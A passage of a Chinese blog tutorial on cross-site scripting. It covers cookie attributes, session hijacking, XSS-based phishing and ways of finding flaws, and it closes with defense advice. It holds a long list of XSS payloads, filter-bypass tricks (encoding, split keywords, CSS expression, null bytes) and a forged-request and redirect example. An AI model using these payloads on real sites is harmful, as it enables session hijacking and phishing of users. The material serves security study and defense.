&#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置cookie值且不知道path，那么path默认为<code>/admin/</code>。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有<code>/admin/</code>目录下的javascipt才能读取前边设置的Cookie。</p><h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h4><p>&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。  </p><ul><li>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</li><li>利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。  </li></ul><p>感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)</p><h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。</p><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。<br>&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。</p><h5 id="B域设置A域Cookie"><a href="#B域设置A域Cookie" class="headerlink" title="B域设置A域Cookie"></a>B域设置A域Cookie</h5><p>&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。</p><h5 id="加载B域时Cookie传入问题"><a href="#加载B域时Cookie传入问题" class="headerlink" title="加载B域时Cookie传入问题"></a>加载B域时Cookie传入问题</h5><p>&#160; &#160; &#160; &#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。  </p><ul><li>相关文章：<a href="https://www.cnblogs.com/cheney256/articles/8942240.html">用P3P header解决iframe跨域访问cookie</a>  </li><li>相关阅读：<strong>《Web前端黑客技术揭秘》p41-42</strong>  </li></ul><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>&#160; &#160; &#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。<br>&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容</p><blockquote><p>&#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。<br>&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。<br>&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面</p></blockquote><p>&#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。<br>&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。  </p><ul><li>通过<code>javascript</code>控制DOM对象来发起一个GET请求，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;www.a.com&#x2F;del.php?id&#x3D;1&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure></li><li>通过<code>javascript</code>自动构造隐藏表单并提交(POST)</li><li>通过<code>XMLHttpRequest</code>直接发送一个POST请求</li></ul><p>&#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。</p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？</p><h4 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h4><p>&#160; &#160; &#160; &#160;即从<code>www.a.com</code>通过xss漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.a.com&#x2F;index.php?search&#x3D;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.b.com&#x2F;index.php&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>&#160; &#160; &#160; &#160;通过<code>javascript</code>来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。</p><h4 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h4><p>&#160; &#160; &#160; &#160;攻击者通过<code>javascript</code>来添加一个新的<code>&lt;Iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p><h2 id="5-XSS漏洞的挖掘"><a href="#5-XSS漏洞的挖掘" class="headerlink" title="5) XSS漏洞的挖掘"></a>5) XSS漏洞的挖掘</h2><p>&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。</p><h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。</p><blockquote><p>分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤</p></blockquote><h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。</p><h4 id="手工检测"><a href="#手工检测" class="headerlink" title="手工检测"></a>手工检测</h4><p>&#160; &#160; &#160; &#160;首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如<code>&quot;&lt;&gt;&amp;;/&#39;:</code>等，如果连<code>&lt;&gt;</code>都未过滤/转义，那么该输入点很可能存在XSS漏洞。<br>&#160; &#160; &#160; &#160;如果<code>&lt;&gt;</code>等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(<code>href,lowsrc,bgsound,backgroud,value,action,dynsrc</code>等)来触发XSS,如<br><code>&lt;input name=&quot;xx&quot; value=&lt;?=$query?&gt;&gt;</code>这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为<code>&lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&gt;</code>。<br>&#160; &#160; &#160; &#160;一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">常见标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>标签</span><br><span class="line">利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.formCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">&quot;URL&quot;</span> <span class="attr">style</span>=<span class="string">&#x27;Xss:expression(alert(/xss));&#x27;</span></span></span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>标签</span><br><span class="line">标准格式</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">利用方式4</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">input标签</span><br><span class="line">标准格式</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">bad</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">利用方式4</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span>标签</span><br><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="comment">&lt;!--原code--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--base64编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>标签</span><br><span class="line">XSS利用方式1</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line">XSS利用方式2</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;xss&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--原code--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--base64编码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line">XSS利用方式3</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">svg<span class="tag">&lt;&gt;</span>标签</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">iframe</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>——引自<strong>wkend</strong>的文章<a href="https://xz.aliyun.com/t/2936">《XSS小节》</a></p><h4 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h4><p>&#160; &#160; &#160; &#160;关于XSS的自动检测软件有许多，如Burp的Scan模块，<a href="https://github.com/rajeshmajumdar/BruteXSS">BruteXSS</a>等，这里不做过多解释。</p><h2 id="6-shellcode的绕过"><a href="#6-shellcode的绕过" class="headerlink" title="6) shellcode的绕过"></a>6) shellcode的绕过</h2><h3 id="绕过XSS-Filter"><a href="#绕过XSS-Filter" class="headerlink" title="绕过XSS-Filter"></a>绕过XSS-Filter</h3><p>&#160; &#160; &#160; &#160;XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。</p><h4 id="空格回车和Tab"><a href="#空格回车和Tab" class="headerlink" title="空格回车和Tab"></a>空格回车和Tab</h4><p>&#160; &#160; &#160; &#160;对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将<code>;</code>作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到<code>;</code>便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字<code>javascript|alert</code>的过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;javasc</span><br><span class="line">ript:aler</span><br><span class="line">t(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure><br><img src="https://img.0x002.com/article/FrontEndHack/5c83f56052a54.webp" alt="IE6下测试成功"></p><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p>&#160; &#160; &#160; &#160;HTML中属性值支持ASCII码形式，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;替换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;其中在ASCII表中116为<code>t</code>，58为<code>:</code>。<br>&#160; &#160; &#160; &#160;也可以将<code>&amp;#01</code>,<code>&amp;#02</code>等插入javascript的头部，还可以将tab(&amp;#09)|换行符(&amp;#10)|回车键(&amp;#13)插入到代码中的任意位置。</p><h4 id="Fuzz标签未过滤事件名"><a href="#Fuzz标签未过滤事件名" class="headerlink" title="Fuzz标签未过滤事件名"></a>Fuzz标签未过滤事件名</h4><p>&#160; &#160; &#160; &#160;如<code>&lt;img src=x onerror=alert(/xss/)&gt;</code>其中的onerror即为IMG标签的一个事件，通常这样的事件都是以<code>on</code>开头，常见的有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onReverse</span><br><span class="line">onSeek</span><br><span class="line">onSynchRestored</span><br><span class="line">onURLFlip</span><br><span class="line">onRepeat</span><br><span class="line">onPause</span><br><span class="line">onstop</span><br><span class="line">onmouseover</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;除此之外还有很多事件可以利用，这里不再一一列举。</p><h4 id="使用Css绕过"><a href="#使用Css绕过" class="headerlink" title="使用Css绕过"></a>使用Css绕过</h4><p>&#160; &#160; &#160; &#160;利用Css样式表可以执行javascript的特性，如<br>&#160; &#160; &#160; &#160;Css直接执行javascript：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;background-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:url(&quot;javascript:alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;css中使用expression执行javascript:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: expression(alert(&#39;xss&#39;))&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; style&#x3D;&quot;xss:expression(alert(&#x2F;xss&#x2F;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;background-image:expression(&quot;alert(&#39;xss&#39;)&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。<br>&#160; &#160; &#160; &#160;除了上述两种，还可以利用@import直接执行javascript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    @import &#39;javascript:alert(&quot;xss&quot;)&#39;;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>&#160; &#160; &#160; &#160;在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。</p><h3 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h3><ul><li>大小写变换;</li><li>利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;</li><li>结合样式表注释字符/**/，通过css执行javascript</li><li>样式标签会过滤<code>\</code>和<code>\0</code>，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过</li><li>Css关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分</li><li>利用浏览器解析注释的问题</li></ul><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>&#160; &#160; &#160; &#160;javascript支持许多的编码格式，如：</p><ul><li>unicode</li><li>escapes</li><li>十六|十|八进制  </li></ul><p><strong>如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力</strong><br>在IE下甚至支持JScript Encode加密后的代码</p><h3 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h3><p>&#160; &#160; &#160; &#160;如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：<a href="http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm">《疯狂的跨站之行》剑心(非原链接)</a></p><h2 id="7-XSS防御"><a href="#7-XSS防御" class="headerlink" title="7) XSS防御"></a>7) XSS防御</h2><p>&#160; &#160; &#160; &#160;说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>&#160; &#160; &#160; &#160;严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>&#160; &#160; &#160; &#160;减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>&#160; &#160; &#160; &#160;设置HttpOnly，开启WAF。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>&#160; &#160; &#160; &#160;感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注我的博客(<a href="http://www.0x002.com)。">www.0x002.com)。</a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" 